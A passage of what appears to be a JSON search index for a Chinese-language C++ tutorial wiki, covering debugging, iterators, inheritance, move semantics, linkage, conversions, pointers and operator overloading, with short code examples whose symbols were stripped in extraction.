size_t；精确宽度别名在实现不支持时可能不存在。 参考资料 LearnCpp 4.1：基本数据类型 LearnCpp 4.2：void 类型 LearnCpp 4.3：对象大小与 sizeof LearnCpp 4.4：有符号整数 LearnCpp 4.5：无符号整数及其风险 LearnCpp 4.6：定宽整数与 size_t cppreference：基本数据类型相关条目","tags":[null,null]},{"title":"集成调试器：断点、单步、监视与调用栈","path":"/wiki/cpp/cpp-topic-integrated-debugger.html","content":"集成调试器提供的是程序状态的观察窗口。断点选择观察时机，单步控制执行范围，监视窗口读取当前状态，调用栈说明控制流如何到达暂停点。四类工具组合起来，才能回答“错误值从哪里出现、又由哪次调用传播到这里”。 集成调试器：单步执行step into 进入被调函数，step over 执行调用但停在当前函数下一行，step out 运行到当前函数返回。 单步观察应围绕一个假设，避免在无关库代码中逐指令漫游。 step into 进入被调函数，step over 执行调用并停在当前函数下一行，step out 运行到当前栈帧返回。选择动作应围绕一个假设：若怀疑参数在调用前已错，先观察调用点；若怀疑函数内部状态转换，再进入实现。 为单步执行保留清晰调用边界 #include iostreamint double_value(int value) return value * 2; int add_one(int value) return double_value(value) + 1; int main() const int resultadd_one(4); std::cout result ; 在 add_one 和 double_value 上设置断点后，step into 与 step over 的差异只体现在是否进入被调函数。 集成调试器：运行与断点断点在指定源位置暂停程序，条件断点和命中次数可以过滤高频路径。 优化构建可能重排或删除代码，源级调试通常使用带调试信息且优化较低的配置。 普通断点验证控制流是否到达某行，条件断点和命中计数用于跳过大量正常迭代，数据断点则在指定内存被写入时暂停。优化构建可能合并、重排或删除源语句，源码行与机器指令无法保持一一对应。 用条件断点过滤高频路径 #include iostreamint main() for (int value; value 10; ++value) if (value == 7) std::cerr interesting value= value ; 条件断点可以把暂停限制在 value 7 的路径，减少循环中的无关停顿。 集成调试器：监视变量局部变量窗口、监视表达式和数据断点分别用于观察当前状态、计算派生值和捕捉写入位置。 求值带副作用的监视表达式可能改变被调试程序，应尽量只读取状态。 监视窗口适合比较暂停点上的局部变量、成员和派生表达式。带函数调用、递增或写操作的监视表达式可能改变被调试程序，观察状态时应保持只读。对象已经越过生命周期后，调试器仍显示一段旧内存也不代表访问合法。 观察派生状态而不修改程序 #include iostreamint main() int completed3; const int total5; const double ratiostatic_castdouble(completed) / total; std::cout ratio ; 调试器中可以监视 completed、total 和 ratio；监视表达式应避免调用有副作用的函数。 集成调试器：调用栈调用栈展示当前线程从入口到暂停点的函数调用链和栈帧。 切换栈帧可以检查每层参数与局部变量，递归错误和错误调用入口通常由此定位。 调用栈由当前线程的活动栈帧组成，每层记录返回位置、参数和局部状态。切换到上层栈帧可追踪错误值从哪里传入，递归问题则可比较相邻帧的规模是否向终止条件收敛。优化可能内联或省略部分帧。 从调用栈回溯错误入口 #include iostreamint leaf(int value) return value + 1; int middle(int value) return leaf(value * 2); int entry(int value) return middle(value); int main() std::cout entry(3) ; 程序暂停在 leaf 时，调用栈依次显示 leaf、middle、entry 和 main；切换栈帧可以检查各层参数。 参考资料 LearnCpp 3.6：集成调试器：单步执行 LearnCpp 3.7：集成调试器：运行与断点 LearnCpp 3.8：集成调试器：监视变量 LearnCpp 3.9：集成调试器：调用栈 cppreference：调试 C++ 程序相关条目","tags":[null,null]},{"title":"迭代器、标准算法与测量边界","path":"/wiki/cpp/cpp-topic-iterators-and-algorithms.html","content":"迭代器把“数据存在哪里”和“如何遍历”分开，标准算法因此能够作用于多种容器。手写选择排序适合观察循环不变量，实际代码更适合复用标准算法。性能测量则必须固定构建模式、输入和计时范围，不能从一段示例推导普遍结论。 使用选择排序整理数组选择排序每轮寻找未排序区间的最小元素并交换到前端，时间复杂度为 O(n²)。 它适合说明排序过程，不是通用生产排序首选；标准库 std::sort 通常更快且经过充分测试。 选择排序在每轮未排序区间中寻找最小元素并交换到前端，时间复杂度为平方级，交换次数较少。它适合演示循环不变量，不适合替代标准库在大型数据上的排序。实现时边界应保证最后一个元素无需再寻找后继。 选择排序的完整实现 #include algorithm#include array#include iostreamtemplate typename T, std::size_t Sizevoid selection_sort(std::arrayT, Size values) for (std::size_t start; start + 1 Size; ++start) auto smalleststart; for (auto indexstart + 1; index Size; ++index) if (values[index] values[smallest]) smallest = index; std::swap(values[start], values[smallest]); int main() std::array values7, 2, 9, 4; selection_sort(values); for (int value : values) std::cout value ; 选择排序便于理解索引和交换，但标准库 std::sort 在通用代码中更合适。 将算法结果作为后续判断依据 const auto foundstd::ranges::find(records, target_id, Record::id);if (found == records.end()) return LookupError::not_found;process(*found); 算法返回的是位置而不是业务成功状态，调用方仍要检查末尾迭代器并决定错误表达。 手写排序适合理解循环不变量；生产代码优先使用标准排序算法，并根据数据规模、稳定性和比较成本选择接口。 迭代器迭代器表示序列位置，半开区间 [first, last) 允许空范围并便于组合算法。 不同迭代器类别支持的操作不同，容器修改还可能使现有迭代器失效。 迭代器表示范围中的位置，半开区间 [first, last) 让空范围和相邻区间容易组合。last 可以比较但不能解引用。不同迭代器类别支持的运算不同，容器修改还可能使位置失效，算法调用前后都要遵守具体规则。 用迭代器表示半开范围 #include iostream#include vectorint main() const std::vector values2, 4, 6; for (auto iteratorvalues.cbegin(); iterator != values.cend(); ++iterator) std::cout *iterator ; [begin, end) 的 end 是尾后迭代器，不能解引用；容器修改可能使现有迭代器失效。 标准库算法标准算法对迭代器范围执行查找、变换、排序和聚合，使操作与容器类型解耦。 C++20 ranges 算法可直接接受范围并支持投影，但返回值和借用范围规则仍需检查。 标准算法把遍历规则和业务操作拆开，返回的迭代器或计数值仍需要按契约解释。C++20 ranges 版本可直接接收范围，并支持投影；它们不会替调用方解决迭代器失效，也不会让返回的借用结果自动超过来源生命周期。 标准算法与投影条件 #include algorithm#include iostream#include vectorint main() std::vector values7, 2, 9, 4; std::sort(values.begin(), values.end()); const auto foundstd::find(values.begin(), values.end(), 7); if (found != values.end()) std::cout *found ; 算法接受迭代器范围并与容器解耦；使用返回迭代器前先和 end 比较。 将算法结果作为后续判断依据 const auto foundstd::ranges::find(records, target_id, Record::id);if (found == records.end()) return LookupError::not_found;process(*found); 算法返回的是位置而不是业务成功状态，调用方仍要检查末尾迭代器并决定错误表达。 算法返回的是位置、计数或新边界，调用方仍要解释“未找到”和失效条件；范围算法也不会替业务层定义错误语义。 C++20 ranges 算法可以直接接收范围并使用投影。传统迭代器算法仍是标准接口，不属于过时用法。 代码计时性能计时应使用单调的 std::chrono::steady_clock，并把待测工作重复到超过计时噪声。 构建模式、优化、预热、输入和硬件都会影响结果；没有真实运行不能声称具体性能数字。 一次计时只描述那次构建、输入和机器上的观测。基准测试应固定优化级别，避免被优化器删除无可观察结果的工作，并执行足够多轮来观察分布。steady_clock 适合测量持续时间，因为它不受系统时钟校正影响。 使用 steady_clock 计时 #include chrono#include iostreamint main() const auto beginstd::chrono::steady_clock::now(); volatile int sink; for (int value; value 1000; ++value) sink = sink + value; const auto endstd::chrono::steady_clock::now(); std::cout std::chrono::duration_caststd::chrono::nanoseconds(end - begin).count() ; steady_clock 不受系统时间回拨影响；一次样本不能得出性能结论，优化级别、预热和输入都需控制。 将算法结果作为后续判断依据 const auto foundstd::ranges::find(records, target_id, Record::id);if (found == records.end()) return LookupError::not_found;process(*found); 算法返回的是位置而不是业务成功状态，调用方仍要检查末尾迭代器并决定错误表达。 计时结果只对实际执行的构建模式、输入和机器有效；文中代码展示测量边界，不据此声明任何性能数字。 参考资料 LearnCpp 18.1：使用选择排序整理数组 LearnCpp 18.2：迭代器 LearnCpp 18.3：标准库算法 LearnCpp 18.4：代码计时 cppreference：迭代器与算法相关条目","tags":[null,null]},{"title":"多重继承、菱形结构与虚基类","path":"/wiki/cpp/cpp-topic-multiple-inheritance.html","content":"一个派生类可以同时拥有多个基类子对象。基类彼此独立时，多重继承适合组合小型接口；多条路径到达同一基类时会形成重复子对象和名称歧义，虚基类把共同基类合并为一份，并把初始化责任交给最派生类。 多重继承多重继承允许多个直接基类，适合组合独立接口，但会带来名称二义性和菱形布局。 含状态的共同基类可能需要虚继承；组合或纯接口继承通常更容易维护。 多重继承可组合多个正交接口，也可能引入重复基类、名称歧义和复杂初始化。带状态的菱形结构常需虚继承，由最派生类负责构造共享虚基类。实现复用若不需要可替换关系，成员组合通常更容易审查。 多重继承组合独立接口 #include iostreamstruct Printable virtual ~Printable() = default; virtual void print() const = 0; ;struct Identified virtual ~Identified() = default; virtual int id() const = 0; ;class Item final : public Printable, public Identified public: void print() const override std::cout item ; int id() const override return 7; ;int main() Item item; item.print(); std::cout item.id() ; 多个无状态接口可以由同一实现类满足；带状态菱形结构需要额外处理二义性和虚基类。 通过基类所有者保存异构对象 std::vectorstd::unique_ptrShape shapes;shapes.push_back(std::make_uniqueCircle());shapes.push_back(std::make_uniqueRectangle());for (const auto shape : shapes) shape-draw(); unique_ptr 管理每个动态对象，基类虚接口保留实际派生类型的行为。 多继承适合组合彼此正交的接口；状态基类、菱形层次和名称冲突会显著提高对象布局与初始化复杂度。 虚基类虚继承让菱形结构中的共同基类在最派生对象中只保留一个子对象。 最派生类负责初始化虚基类，构造规则和布局成本因此更复杂。 虚继承让菱形层次共享一个基类子对象，由最派生类负责构造该虚基类。它解决重复基类状态，却增加对象布局、初始化和名称查找复杂度。层次能通过接口组合重构时，通常无需承担这项成本。 虚继承合并共同基类 #include iostreamstruct Identity explicit Identity(int id) : idid int id; ;struct Reader : virtual Identity using Identity::Identity; ;struct Writer : virtual Identity using Identity::Identity; ;struct Service : Reader, Writer explicit Service(int id) : Identityid, Readerid, Writerid ;int main() Service service7; std::cout service.id ; 最派生类 Service 负责初始化唯一的 Identity 虚基类子对象。 参考资料 LearnCpp 24.9：多重继承 LearnCpp 25.8：虚基类 cppreference：继承相关条目 cppreference：虚函数相关条目","tags":[null,null]},{"title":"右值引用、移动构造与 std::move","path":"/wiki/cpp/cpp-topic-move-semantics.html","content":"复制需要建立两个独立状态，移动则允许目标接管源对象资源。右值引用参与重载选择，移动构造和移动赋值完成实际状态转移；std::move 只是把表达式转换成可供移动重载匹配的右值类别。 智能指针与移动语义智能指针把动态对象所有权编码进类型，移动语义允许资源在对象之间转移而不执行深复制。 已移除的 std::auto_ptr 不能用于现代代码；独占所有权使用 unique_ptr，共享所有权需要明确理由。 智能指针是拥有动态对象的 RAII 类型，不是所有裸指针的替代品。unique_ptr 表达单一所有者，shared_ptr 表达共同所有权，weak_ptr 表达对 shared 对象的非拥有观察；普通函数参数中的短期借用仍用引用或裸指针。 所有权进入类型系统 #include iostream#include memoryint main() auto valuestd::make_uniqueint(42); auto movedstd::move(value); if (!value moved) std::cout *moved ; unique_ptr 表达独占所有权，移动后源指针为空；已移除的 auto_ptr 不应出现在现代代码中。 std::auto_ptr 已在 C++17 移除；现代所有权类型是 std::unique_ptr、std::shared_ptr 和 std::weak_ptr。 右值引用T 可以绑定到右值并支持资源转移，但具名右值引用表达式本身是左值。 右值引用不会自动移动对象，实际移动发生在被选中的构造、赋值或其他重载中。 右值引用可以绑定即将销毁或显式标记为可复用的对象，但引用变量一旦有了名字，该表达式就是左值。是否转移资源取决于最终调用的函数；对一个没有移动重载的类型使用 std::move，仍可能执行复制。 具名右值引用仍是左值表达式 #include iostream#include utilityvoid inspect(int) std::cout lvalue ; void inspect(int) std::cout rvalue ; int main() int reference3; inspect(reference); inspect(std::move(reference)); T 可以绑定右值，但 reference 有名字，所以表达式本身是左值；再次转换后才匹配右值重载。 移动构造与移动赋值移动操作从源对象接管资源，并让源对象保持有效但值未指定、可析构和可重新赋值。 移动构造通常声明 noexcept，资源类还要处理移动赋值前目标已有资源和自移动边界。 移动构造接管资源后，源对象必须仍可析构，也应满足类型为“已移动对象”声明的其他操作。移动赋值还要处理目标已有资源和自移动。能用标准资源成员表达所有权时，让编译器组合它们的移动操作比手写交换裸指针更可靠。 移动构造接管资源 #include cstddef#include iostream#include utilityclass Bufferpublic: explicit Buffer(std::size_t size) : m_sizesize, m_datanew int[size] ~Buffer() delete[] m_data; Buffer(const Buffer) = delete; Buffer operator=(const Buffer) = delete; Buffer(Buffer other) noexcept : m_sizestd::exchange(other.m_size, 0), m_datastd::exchange(other.m_data, nullptr) std::size_t size() const return m_size; private: std::size_t m_size; int* m_data;;int main() Buffer first4; Buffer secondstd::move(first); std::cout second.size() ; 移动构造把指针和长度转移，并把源对象留在可析构状态；实际业务优先 vector 或 unique_ptr。 在接口中表达所有权转移 std::unique_ptrTask make_task();void submit(std::unique_ptrTask task);auto taskmake_task();submit(std::move(task)); make_task 创建唯一所有者，submit 接管所有权；移动后原指针为空但仍可析构和重新赋值。 源对象移出后仍需可析构和可赋值，目标对象原有资源也要正确释放；标准资源成员能组合完成这些要求时优先零规则。 std::movestd::move 只把表达式转换为 xvalue，不执行数据移动。 调用后是否发生移动取决于重载；对 const 对象使用 std::move 通常仍会选择复制。 std::move 只执行到右值引用的转换，不读取、不清空也不转移资源。随后是否移动由重载解析决定。对 const 对象使用它通常仍会复制，因为常见移动构造需要可修改右值；移动后的对象应只执行类型明确允许的操作。 std::move 只改变值类别 #include iostream#include string#include utilityint main() std::string sourcepayload; std::string targetstd::move(source); std::cout target source.size() ; 资源转移由 string 移动构造完成；source 移动后有效但值未指定，只能销毁或重新赋值后再依赖内容。 移出对象仍必须可析构和可赋值。容器按值返回时的效率也来自复制消除与移动语义，vector 的接口传递展示了所有权如何跨函数边界移动。 参考资料 LearnCpp 22.1：智能指针与移动语义 LearnCpp 22.2：右值引用 LearnCpp 22.3：移动构造与移动赋值 LearnCpp 22.4：std::move cppreference：移动语义与智能指针相关条目","tags":[null,null]},{"title":"命名空间、链接性与单一定义规则","path":"/wiki/cpp/cpp-topic-namespaces-and-linkage.html","content":"多文件项目中的名称问题分成两个层面：名称查找决定当前表达式引用哪个声明，链接性决定不同翻译单元中的声明是否代表同一实体。命名空间、inline、extern 和匿名命名空间分别作用在这些边界上。 自定义命名空间与作用域解析命名空间可以分散定义并在多个文件中继续打开，作用域解析运算符用于限定名称来源。 库代码应把公共实体放入稳定命名空间，但不能向 std 命名空间添加普通声明。 命名空间可以在多个文件中重复打开，同名声明会进入同一逻辑作用域。限定名称使调用点明确依赖来源，嵌套命名空间语法则减少层层花括号。命名空间不负责资源生命周期，也不能替代模块或链接边界。 在自定义命名空间中组织实现 #include iostreamnamespace app::formatint version() return 1; int main() std::cout app::format::version() ; 嵌套命名空间把公共名称置于稳定的限定路径，业务代码不能向 std 添加声明。 内部链接具有内部链接的名称只在当前翻译单元中指向对应实体。 命名空间作用域 const 对象默认具有内部链接；匿名命名空间也可用于限制实现细节。 内部链接让一个名称只在当前翻译单元指向实体。命名空间作用域的非 volatile const 默认具有内部链接，匿名命名空间也常用于源文件私有实现。头文件中放置状态实体时必须理解每个翻译单元可能获得独立副本。 限制翻译单元私有实现 #include iostreamnamespaceint helper() return 4; int main() std::cout helper() ; 匿名命名空间中的 helper 只能在当前翻译单元使用，避免对外暴露链接符号。 外部链接与变量前向声明外部链接允许不同翻译单元的声明指向同一实体，extern 声明通常不定义存储。 全局变量应在一个源文件中定义并通过头文件声明，声明类型和限定符必须保持一致。 外部链接允许不同翻译单元中的声明指向同一实体。头文件放 extern 声明，一个源文件提供定义，所有类型与限定符必须一致。把定义直接放入头文件会产生重复定义，除非实体符合 inline 或模板的单一定义规则。 extern 声明与单一定义 // config.hppextern int active_workers;// config.cppint active_workers2;// main.cpp#include iostreamextern int active_workers;int main() std::cout active_workers ; 跨文件共享变量需要一个定义和一致的声明；示例展示三个文件的角色，实际项目应把声明集中到头文件。 inline 函数与变量inline 允许同一实体在多个翻译单元中出现等价定义，并要求满足单一定义规则。 是否实际内联展开由优化器决定；inline 关键字的主要现代用途是处理跨翻译单元定义。 现代 C++ 中 inline 的语言作用主要是允许一个实体在多个翻译单元中出现等价定义，同时仍表示同一实体。编译器是否展开函数调用属于优化决定，不受关键字强制。定义放在头文件中的小函数、模板和 C++17 的 inline 变量，才是它最常见的工程场景。 头文件中的 inline 定义 #include iostreaminline int square(int value) return value * value; int main() std::cout square(5) ; inline 主要解决跨翻译单元的等价定义和单一定义规则，不要求编译器实际内联展开。 跨文件共享全局常量C++17 inline constexpr 变量可以在头文件中定义，并让所有翻译单元引用同一实体。 旧式 extern 常量仍可使用，但需要在一个源文件中提供定义并维护声明一致性。 C++17 的 inline constexpr 变量可以直接在头文件定义，并在各翻译单元中表示同一实体。它适合公共编译期常量，省去单独源文件定义。若值属于实现细节或每个翻译单元都可独立拥有，内部链接常量仍然足够。 跨文件共享 inline constexpr #include iostreaminline constexpr int max_connections16;int main() std::cout max_connections ; C++17 起 inline constexpr 变量可以在头文件中提供单一定义实体。 using 声明与 using 指令using 声明只引入指定名称，using 指令让整个命名空间参与非限定名称查找。 using 指令不应放进公共头文件；局部作用域中的精确 using 声明更容易控制冲突。 using name = Type 创建类型别名，using namespace_name::member 把单个名称引入当前作用域，using 指令则让整个命名空间参与查找。头文件中的 using 指令会影响所有包含者，容易制造冲突；限定名或函数内部的局部声明更可控。 优先使用精确的 using 声明 #include iostreamint main() using std::cout; cout one ; using 声明只引入一个名称；公共头文件不应把整个命名空间加入非限定查找。 匿名命名空间与内联命名空间匿名命名空间中的名称具有内部链接，适合翻译单元私有实现。 内联命名空间常用于库版本管理，使成员也可通过外层命名空间访问。 匿名命名空间使其中名称具有翻译单元内的身份，适合源文件实现细节。内联命名空间则让版本命名空间中的名称可从外层直接查找，常用于库的 ABI 版本组织。两者语法相似，解决的问题完全不同。 用内联命名空间表达版本 #include iostreamnamespace apiinline namespace v2 int version() return 2; int main() std::cout api::version() ; 内联命名空间允许 api::version() 访问当前版本，同时保留 api::v2::version() 的明确路径。 参考资料 LearnCpp 7.2：自定义命名空间与作用域解析 LearnCpp 7.6：内部链接 LearnCpp 7.7：外部链接与变量前向声明 LearnCpp 7.9：inline 函数与变量 LearnCpp 7.10：跨文件共享全局常量 LearnCpp 7.13：using 声明与 using 指令 LearnCpp 7.14：匿名命名空间与内联命名空间 cppreference：作用域、存储期与链接性相关条目","tags":[null,null]},{"title":"隐式转换、数值提升与窄化检查","path":"/wiki/cpp/cpp-topic-numeric-conversions.html","content":"表达式中的类型往往在运算前已经变化。整数提升、浮点提升和通常算术转换共同决定实际操作数类型；赋值或初始化又可能把结果转换到更窄的目标。static_cast 能让意图可见，但范围与精度仍需在转换前验证。 概念索引 主题 规则边界 隐式类型转换 隐式转换用于初始化、赋值、调用和运算符匹配，并沿标准转换序列完成。 浮点提升与整数提升 整数提升把较窄整数和部分字符类型提升到 int 或 unsigned int，浮点提升把 float 提升到 double。 数值转换 非提升的整数、浮点和跨类别转换可能改变范围、精度或舍入结果。 窄化转换、列表初始化与 constexpr 初始化器 列表初始化会拒绝大多数潜在窄化转换，但常量表达式在值可表示时有部分例外。 通常算术转换 二元算术和比较会把操作数转换到共同类型，规则受到浮点等级、整数等级和符号性影响。 显式类型转换与 static_cast static_cast 适合数值转换、相关指针转换和用户定义转换等编译期可检查场景。 隐式类型转换转换可编译不代表无损；符号性、范围、精度和生命周期都需要结合来源与目标类型检查。 隐式转换会出现在初始化、赋值、运算和函数调用中。它降低调用噪声，也可能悄悄改变符号性、精度或重载候选。接口设计应避免需要多步用户定义转换才能理解的调用，审查表达式时先确定转换后的共同类型。 让隐式转换保持在安全范围 #include iostreamvoid print(double value) std::cout value ; int main() const int count3; print(count); int 到 double 是标准转换，但窄化和有损转换应使用显式检查和明确的接口。 浮点提升与整数提升提升通常扩大可表示范围，是重载解析和通常算术转换的一部分。 整数提升会把较窄整数和字符类型提升到 int 或 unsigned int，浮点提升则把 float 提升为 double 的特定调用场景。提升通常保持值，但会改变表达式类型，进而影响重载选择和后续算术转换。 注意整型提升后的运算类型 #include iostreamint main() const std::int8_t left100; const std::int8_t right27; const int sumleft + right; std::cout sum ; 小于 int 的整型通常先提升为 int 再运算；保存结果回窄类型前要检查范围。 数值转换超范围浮点转整数会产生未定义行为；外部数据转换前必须显式验证边界。 数值转换可能保持值、按模转换或丢失精度，具体结果取决于源类型、目标类型和值域。显式写出 static_cast 只能暴露意图，不提供范围验证。外部数据在转换前应先检查目标是否可表示。 转换前校验目标范围 #include iostream#include limitsint main() const long source42; if (source = std::numeric_limitsint::min() source = std::numeric_limitsint::max()) std::cout static_castint(source) ; 显式转换只改变表达式类型，不会补充范围检查。 窄化转换、列表初始化与 constexpr 初始化器拒绝编译是边界保护而不是障碍；确认范围后再使用显式转换表达意图。 列表初始化会拒绝多数可能丢失信息的窄化转换，使错误在编译期暴露。常量表达式若值可表示，某些整型转换仍被允许。显式 static_cast 可以绕过语法限制，但不会证明值安全，运行期数据仍需先做范围检查。 列表初始化拒绝窄化 #include iostreamint main() int count3; double rate2.5; std::cout count * rate ; 花括号初始化会在编译期拒绝很多可能丢失信息的转换；确实需要转换时使用显式写法并说明边界。 在转换前检查目标范围 if (source = std::numeric_limitsint::min() source = std::numeric_limitsint::max()) const int valuestatic_castint(source); use(value); static_cast 表达转换意图，范围判断负责保证值可表示。 通常算术转换有符号负值与无符号值混合时常产生意外结果，接口和局部变量应尽量使用一致类型。 二元算术会通过通常算术转换把操作数带到共同类型。混合有符号与无符号、整数与浮点时，结果类型可能比源码直觉更强势。把单位和范围统一到明确类型，再开始计算，比在结果末尾强转更可靠。 混合类型运算前统一单位 #include iostreamint main() const int cents250; const double tax_rate0.08; const double totalstatic_castdouble(cents) * (1.0 + tax_rate); std::cout total ; 通常算术转换会先决定共同类型；显式转换和单位命名能减少隐式精度损失。 显式类型转换与 static_cast它不能移除 const，也不执行运行时类型检查；对应需求应选择 const_cast 或 dynamic_cast，并重新审视设计。 static_cast 把允许的转换意图写进源码，适合数值、枚举和已知继承关系转换。它不检查结果是否可表示，也不验证基类对象的真实派生类型。转换点附近应保留证明条件，例如范围判断或由接口保证的类型关系。 static_cast 只表达已验证的转换 #include iostreamint main() const double seconds2.75; const int whole_secondsstatic_castint(seconds); std::cout whole_seconds ; static_cast 会截断小数部分；调用方应在转换前决定这是否符合业务规则。 参考资料 LearnCpp 10.1：隐式类型转换 LearnCpp 10.2：浮点提升与整数提升 LearnCpp 10.3：数值转换 LearnCpp 10.4：窄化转换、列表初始化与 constexpr 初始化器 LearnCpp 10.5：通常算术转换 LearnCpp 10.6：显式类型转换与 static_cast cppreference：类型转换、别名与推导相关条目","tags":[null,null]},{"title":"指针、引用返回与 std::optional","path":"/wiki/cpp/cpp-topic-pointers-and-optional.html","content":"指针、引用和 std::optional 都能参与“结果可能不存在”的接口设计，但表达的契约不同。指针携带地址并可为空，引用必须绑定对象，optionalT 直接拥有一个可能存在的 T。返回这些类型时，还要确认被引用对象的生命周期能够覆盖调用方使用期。 指针指针保存对象或函数地址，可以为空、重新指向其他目标并参与有限的指针运算。 裸指针本身不表达所有权；接口需要通过类型和文档区分观察、可空与拥有关系。 指针保存对象或函数地址，可以为空、复制和改指向；解引用前必须确保非空、对齐正确且目标仍在生命周期内。指针本身不说明拥有权。现代接口通常用智能指针表达所有者，用裸指针表达可空借用，用引用表达必需借用。 指针表达可选对象 #include iostreamint main() int value5; int* pointervalue; if (pointer != nullptr) *pointer += 1; std::cout value ; 指针可以为空并可重新指向；解引用前必须满足非空和生命周期有效两个条件。 空指针nullptr 是 std::nullptr_t 类型的空指针字面量，能避免整数 0 在重载解析中的歧义。 解引用空指针是未定义行为，使用前必须通过控制流、契约或非空包装类型建立保证。 nullptr 的类型是 std::nullptr_t，能够转换为任意指针类型，却不会像整数 0 那样参与普通整型重载。它消除了 NULL 可能被定义为整数带来的歧义。空指针只能比较、赋值或传递，任何解引用都没有定义。 用 nullptr 表达空指针 #include iostreamvoid print(const int* value) if (value == nullptr) std::cout empty ; return; std::cout *value ;int main() print(nullptr); nullptr 的类型是 std::nullptr_t，能避免整数 0 参与指针重载时的歧义。 指针与 const顶层 const 限制指针自身重新赋值，底层 const 限制通过指针修改目标。 const T、T const 和 const T* const 表达不同约束，阅读时从标识符向外分析。 const int* 是指向只读 int 的可改指针，int* const 是不可改指向的可写指针，二者可以组合。const 从右向左阅读有助于区分约束落在哪一层。底层 const 不能被安全移除后修改原本 const 对象。 分别表达指向 const 和 const 指针 #include iostreamint main() int first1; int second2; int* const fixedfirst; *fixed = 3; const int* movablefirst; movable = second; std::cout *fixed *movable ; const int* 限制通过指针修改对象，int* const 限制指针本身改指向；两种约束可组合。 按地址传参指针参数适合表达可空借用或与 C API 交互，调用方传入对象地址。 不能为空的单对象参数通常用引用更直接；连续范围应使用 span 或迭代器对而非裸指针加隐含长度。 指针形参适合表达可空借用或与 C API 交互。函数要么检查 nullptr，要么在更强边界保证非空并记录前置条件。只需一个必需对象时引用更直接；需要所有权转移时使用智能指针而不是裸地址。 指针参数表达可空输出 #include iostreambool try_parse(int input, int* output) if (output == nullptr || input 0) return false; *output = input; return true;int main() int result; if (try_parse(7, result)) std::cout result ; 指针参数同时表达可空性和写入位置；optional 或结构化结果通常更容易维护。 按地址传参的边界指针形参按值复制，因此改变指针指向不会修改调用方指针，除非传入指针的引用或二级指针。 输出缓冲区接口必须同时携带容量，并对重叠、终止符和写入数量建立契约。 指针形参把可空性带进每个调用点，因此函数要么检查空值，要么把非空前置条件写清楚并在更强类型边界保证。连续序列不能只传首地址，还要携带长度；C++20 的 span 能把这两个值绑定在同一借用对象中。 地址参数必须说明所有权 #include iostreamvoid observe(const int* value) if (value != nullptr) std::cout *value ;int main() const int value8; observe(value); 这里的指针只是借用，不负责 delete；所有权应通过 unique_ptr 等类型表达。 按引用与地址返回返回引用或指针可以避免复制并保留对象身份，但返回目标必须比调用方使用结果活得更久。 不得返回局部自动对象地址；容器重分配和对象移动也可能使先前返回的引用失效。 返回引用不会延长局部对象生命周期。只有被引用对象由调用方、静态存储期对象或其他足够长寿的所有者维护时，返回借用才成立。接口还应避免让调用方在一次完整表达式之后继续持有指向临时结果内部的引用。 只返回仍然存活对象的引用 #include iostream#include vectorint first(std::vectorint values) return values.front(); int main() std::vector values1, 2; first(values) = 9; std::cout values.front() ; 返回引用绑定到 vector 元素；不能返回局部变量的引用，也要注意容器重分配导致的失效。 只返回生命周期足够长的对象 const std::string name(const User user) return user.name(); 返回引用借用 user 内部状态，调用方必须保证 user 和对应成员仍然有效。 输入参数与输出参数输入参数向函数提供数据，输出参数让函数修改调用方对象，输入输出参数同时承担两种角色。 优先用返回值表达主要结果；多结果可使用结构体，只有需要原地复用或接口约束时使用输出参数。 参数方向应从类型和名称可见：按值或 const 引用通常是输入，可写引用是输入输出。多个输出参数会把一次结果拆散，容易出现部分更新；结构化返回值可以一次性表达多个成功结果，失败状态再由结果类型或异常承载。 把输入和输出参数分开表达 #include iostreambool split(int value, int quotient, int remainder) if (value 0) return false; quotient = value / 10; remainder = value % 10; return true;int main() int quotient, remainder; if (split(27, quotient, remainder)) std::cout quotient remainder ; 非 const 引用参数是输出位置；返回结构体或 tuple 也可以把多个结果组合成一个值。 指针、引用与 const 的类型推导auto 默认按值推导并去除引用和顶层 const，auto、const auto 与 auto* 保留不同关系。 decltype 保留表达式相关规则，decltype(auto) 可用于精确传播返回类型，但也更容易意外返回引用。 模板与 auto 推导会根据值传递、引用和转发引用采用不同规则。按值通常丢弃顶层 const 与引用，auto 保留所绑定对象的 const，auto 则依初始化器值类别折叠。调试复杂声明时可用 decltype 和静态断言验证推导结果。 用 decltype 检查推导出的引用类型 #include type_traits#include iostreamint main() int value; auto referencevalue; static_assert(std::is_lvalue_reference_vdecltype(reference)); std::cout reference ; auto、auto 和 auto 的推导规则不同；需要保留顶层 const 或值类别时必须选择正确声明形式。 std::optionalstd::optional 表示一个 T 值可能存在或缺失，自 C++17 可用。 它不携带失败原因；需要错误信息时可使用结构化结果或 C++23 std::expected。 std::optionalT 表示一个值可能存在，但不说明缺失原因。只有成功值和“没有值”两种状态时，它比哨兵值更准确；调用方必须检查后才能解引用。错误类别或诊断信息也是接口的一部分时，C++23 的 std::expectedT, E 能把成功与失败都编码进返回类型。 用 optional 表示可能没有结果 #include iostream#include optionalstd::optionalint parse_positive(int value) if (value = 0) return std::nullopt; return value;int main() if (const auto resultparse_positive(7)) std::cout *result ; optional 明确表示“有值或没有值”；C++23 的 expected 适合同时携带错误信息的结果。 std::optional 自 C++17 可用；需要返回错误值时可在 C++23 使用 std::expected。本文示例仍保持 C++20 可编译。 参考资料 LearnCpp 12.7：指针 LearnCpp 12.8：空指针 LearnCpp 12.9：指针与 const LearnCpp 12.10：按地址传参 LearnCpp 12.11：按地址传参的边界 LearnCpp 12.12：按引用与地址返回 LearnCpp 12.13：输入参数与输出参数 LearnCpp 12.14：指针、引用与 const 的类型推导 LearnCpp 12.15：std::optional cppreference：复合类型：引用与指针相关条目","tags":[null,null]},{"title":"下标、调用、转换与赋值运算符","path":"/wiki/cpp/cpp-topic-operator-interfaces.html","content":"下标和函数调用运算符让对象表现得像容器或可调用对象，转换运算符改变类型参与方式，赋值运算符则必须处理目标原有状态、自赋值和异常边界。资源拥有类还要区分浅复制与深复制，或者通过标准资源成员采用零规则。 重载下标运算符operator[] 通常提供 const 与非 const 重载，并返回元素引用以支持读取或修改。 是否检查边界属于类型契约；可同时提供 at 风格的检查接口。 下标运算符通常提供可写与 const 两个重载，分别返回 T 和 const T。是否检查边界属于类型契约；若 operator[] 不检查，可另提供 at()。多维访问在 C++23 可使用多个下标实参，C++20 常返回代理或分层调用。 const 与非 const 下标重载 #include array#include cstddef#include iostreamclass Bufferpublic: int operator[](std::size_t index) return m_data[index]; const int operator[](std::size_t index) const return m_data[index]; private: std::arrayint, 3 m_data;;int main() Buffer buffer; buffer[1] = 7; std::cout buffer[1] ; 两个重载分别支持修改和只读对象；是否检查边界应由类型契约明确。 重载函数调用运算符operator() 让对象成为可调用对象，并可通过成员保存调用状态。 函数对象适合策略和算法参数，lambda 